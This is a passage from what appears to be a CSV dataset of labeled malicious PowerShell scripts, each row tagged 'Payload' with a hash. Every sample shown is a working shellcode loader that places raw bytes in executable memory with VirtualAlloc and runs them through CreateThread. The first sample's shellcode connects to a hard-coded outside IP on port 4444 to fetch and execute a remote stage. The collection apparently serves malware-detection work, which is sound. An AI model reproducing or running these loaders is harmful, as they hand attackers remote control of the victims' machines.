0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x54,0xed,0xdd,0xb2,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
8ce91ff2e82a3ccc712ae72ae0468700b01a5182354e079384c4fd3846aff3ca,"
$Udz = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $Udz -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x77,0xd6,0xfb,0xa5,0xdb,0xd7,0xd9,0x74,0x24,0xf4,0x5f,0x33,0xc9,0xb1,0x47,0x83,0xc7,0x04,0x31,0x57,0x0f,0x03,0x57,0x78,0x34,0x0e,0x59,0x6e,0x3a,0xf1,0xa2,0x6e,0x5b,0x7b,0x47,0x5f,0x5b,0x1f,0x03,0xcf,0x6b,0x6b,0x41,0xe3,0x00,0x39,0x72,0x70,0x64,0x96,0x75,0x31,0xc3,0xc0,0xb8,0xc2,0x78,0x30,0xda,0x40,0x83,0x65,0x3c,0x79,0x4c,0x78,0x3d,0xbe,0xb1,0x71,0x6f,0x17,0xbd,0x24,0x80,0x1c,0x8b,0xf4,0x2b,0x6e,0x1d,0x7d,0xcf,0x26,0x1c,0xac,0x5e,0x3d,0x47,0x6e,0x60,0x92,0xf3,0x27,0x7a,0xf7,0x3e,0xf1,0xf1,0xc3,0xb5,0x00,0xd0,0x1a,0x35,0xae,0x1d,0x93,0xc4,0xae,0x5a,0x13,0x37,0xc5,0x92,0x60,0xca,0xde,0x60,0x1b,0x10,0x6a,0x73,0xbb,0xd3,0xcc,0x5f,0x3a,0x37,0x8a,0x14,0x30,0xfc,0xd8,0x73,0x54,0x03,0x0c,0x08,0x60,0x88,0xb3,0xdf,0xe1,0xca,0x97,0xfb,0xaa,0x89,0xb6,0x5a,0x16,0x7f,0xc6,0xbd,0xf9,0x20,0x62,0xb5,0x17,0x34,0x1f,0x94,0x7f,0xf9,0x12,0x27,0x7f,0x95,0x25,0x54,0x4d,0x3a,0x9e,0xf2,0xfd,0xb3,0x38,0x04,0x02,0xee,0xfd,0x9a,0xfd,0x11,0xfe,0xb3,0x39,0x45,0xae,0xab,0xe8,0xe6,0x25,0x2c,0x15,0x33,0xd3,0x29,0x81,0xe2,0x65,0x6f,0x48,0x73,0x64,0x8f,0x7b,0xdf,0xe1,0x69,0x2b,0x8f,0xa1,0x25,0x8b,0x7f,0x02,0x96,0x63,0x6a,0x8d,0xc9,0x93,0x95,0x47,0x62,0x39,0x7a,0x3e,0xda,0xd5,0xe3,0x1b,0x90,0x44,0xeb,0xb1,0xdc,0x46,0x67,0x36,0x20,0x08,0x80,0x33,0x32,0xfc,0x60,0x0e,0x68,0xaa,0x7f,0xa4,0x07,0x52,0xea,0x43,0x8e,0x05,0x82,0x49,0xf7,0x61,0x0d,0xb1,0xd2,0xfa,0x84,0x27,0x9d,0x94,0xe8,0xa7,0x1d,0x64,0xbf,0xad,0x1d,0x0c,0x67,0x96,0x4d,0x29,0x68,0x03,0xe2,0xe2,0xfd,0xac,0x53,0x57,0x55,0xc5,0x59,0x8e,0x91,0x4a,0xa1,0xe5,0x23,0xb6,0x74,0xc3,0x51,0xd6,0x44;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$uUZ=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($uUZ.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$uUZ,0,0,0);for (;;){Start-sleep 60};

",Payload
6883d58737eb8ee99991cb2f6517b24b9201b1ead0a9380a06b4718977974be4,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xca,0xbf,0x5e,0x83,0x44,0x0e,0xd9,0x74,0x24,0xf4,0x58,0x33,0xc9,0xb1,0x47,0x31,0x78,0x18,0x03,0x78,0x18,0x83,0xe8,0xa2,0x61,0xb1,0xf2,0xb2,0xe4,0x3a,0x0b,0x42,0x89,0xb3,0xee,0x73,0x89,0xa0,0x7b,0x23,0x39,0xa2,0x2e,0xcf,0xb2,0xe6,0xda,0x44,0xb6,0x2e,0xec,0xed,0x7d,0x09,0xc3,0xee,0x2e,0x69,0x42,0x6c,0x2d,0xbe,0xa4,0x4d,0xfe,0xb3,0xa5,0x8a,0xe3,0x3e,0xf7,0x43,0x6f,0xec,0xe8,0xe0,0x25,0x2d,0x82,0xba,0xa8,0x35,0x77,0x0a,0xca,0x14,0x26,0x01,0x95,0xb6,0xc8,0xc6,0xad,0xfe,0xd2,0x0b,0x8b,0x49,0x68,0xff,0x67,0x48,0xb8,0xce,0x88,0xe7,0x85,0xff,0x7a,0xf9,0xc2,0xc7,0x64,0x8c,0x3a,0x34,0x18,0x97,0xf8,0x47,0xc6,0x12,0x1b,0xef,0x8d,0x85,0xc7,0x0e,0x41,0x53,0x83,0x1c,0x2e,0x17,0xcb,0x00,0xb1,0xf4,0x67,0x3c,0x3a,0xfb,0xa7,0xb5,0x78,0xd8,0x63,0x9e,0xdb,0x41,0x35,0x7a,0x8d,0x7e,0x25,0x25,0x72,0xdb,0x2d,0xcb,0x67,0x56,0x6c,0x83,0x44,0x5b,0x8f,0x53,0xc3,0xec,0xfc,0x61,0x4c,0x47,0x6b,0xc9,0x05,0x41,0x6c,0x2e,0x3c,0x35,0xe2,0xd1,0xbf,0x46,0x2a,0x15,0xeb,0x16,0x44,0xbc,0x94,0xfc,0x94,0x41,0x41,0x68,0x90,0xd5,0x25,0xd9,0x01,0xe7,0xd2,0x23,0x36,0xf6,0x7e,0xad,0xd0,0xa8,0x2e,0xfd,0x4c,0x08,0x9f,0xbd,0x3c,0xe0,0xf5,0x31,0x62,0x10,0xf6,0x9b,0x0b,0xba,0x19,0x72,0x63,0x52,0x83,0xdf,0xff,0xc3,0x4c,0xca,0x85,0xc3,0xc7,0xf9,0x7a,0x8d,0x2f,0x77,0x69,0x79,0xc0,0xc2,0xd3,0x2f,0xdf,0xf8,0x7e,0xcf,0x75,0x07,0x29,0x98,0xe1,0x05,0x0c,0xee,0xad,0xf6,0x7b,0x65,0x67,0x63,0xc4,0x11,0x88,0x63,0xc4,0xe1,0xde,0xe9,0xc4,0x89,0x86,0x49,0x97,0xac,0xc8,0x47,0x8b,0x7d,0x5d,0x68,0xfa,0xd2,0xf6,0x00,0x00,0x0d,0x30,0x8f,0xfb,0x78,0xc0,0xf3,0x2d,0x44,0xb6,0x1d,0xee;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
